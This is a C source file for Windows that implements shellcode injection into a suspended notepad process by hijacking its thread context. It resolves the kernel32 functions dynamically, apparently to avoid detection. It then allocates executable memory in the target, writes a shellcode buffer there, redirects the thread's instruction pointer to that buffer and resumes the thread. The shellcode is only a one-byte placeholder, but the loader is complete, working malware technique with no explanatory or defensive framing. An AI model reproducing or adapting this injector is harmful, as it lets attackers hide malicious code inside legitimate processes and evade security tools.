#include <Windows.h>
#include <stdio.h>
#include "safeApi.h"

char shellcode[] = { 0x12 };


    typedef BOOL (WINAPI *CreateProcessW_t)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
    typedef DWORD (WINAPI *SuspendThread_t)(HANDLE);
    typedef LPVOID (WINAPI *VirtualAllocEx_t)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
    typedef BOOL (WINAPI *WriteProcessMemory_t)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
    typedef BOOL (WINAPI *GetThreadContext_t)(HANDLE, LPCONTEXT);
    typedef BOOL (WINAPI *SetThreadContext_t)(HANDLE, const CONTEXT*);
    typedef DWORD (WINAPI *ResumeThread_t)(HANDLE);

int main() {
    CreateProcessW_t pCreateProcessW = (CreateProcessW_t)SafeGetProcAddress(L"kernel32.dll", "CreateProcessW");
    SuspendThread_t pSuspendThread = (SuspendThread_t)SafeGetProcAddress(L"kernel32.dll", "SuspendThread");
    VirtualAllocEx_t pVirtualAllocEx = (VirtualAllocEx_t)SafeGetProcAddress(L"kernel32.dll", "VirtualAllocEx");
    WriteProcessMemory_t pWriteProcessMemory = (WriteProcessMemory_t)SafeGetProcAddress(L"kernel32.dll", "WriteProcessMemory");
    GetThreadContext_t pGetThreadContext = (GetThreadContext_t)SafeGetProcAddress(L"kernel32.dll", "GetThreadContext");
    SetThreadContext_t pSetThreadContext = (SetThreadContext_t)SafeGetProcAddress(L"kernel32.dll", "SetThreadContext");
    ResumeThread_t pResumeThread = (ResumeThread_t)SafeGetProcAddress(L"kernel32.dll", "ResumeThread");

    STARTUPINFOW siw = { 0 };
    siw.cb = sizeof(siw);
    PROCESS_INFORMATION pi = { 0 };
    pCreateProcessW(NULL, L"notepad", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &siw, &pi);
    
    LPVOID lpBuffer = pVirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    pWriteProcessMemory(pi.hProcess, lpBuffer, shellcode, sizeof(shellcode), NULL);

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_ALL;
    pGetThreadContext(pi.hThread, &ctx);
#ifdef _WIN64
    ctx.Rip = (DWORD64)lpBuffer;
#else
    ctx.Eip = (DWORD)lpBuffer;
#endif
    pSetThreadContext(pi.hThread, &ctx);
    pResumeThread(pi.hThread);
    return 0;
}
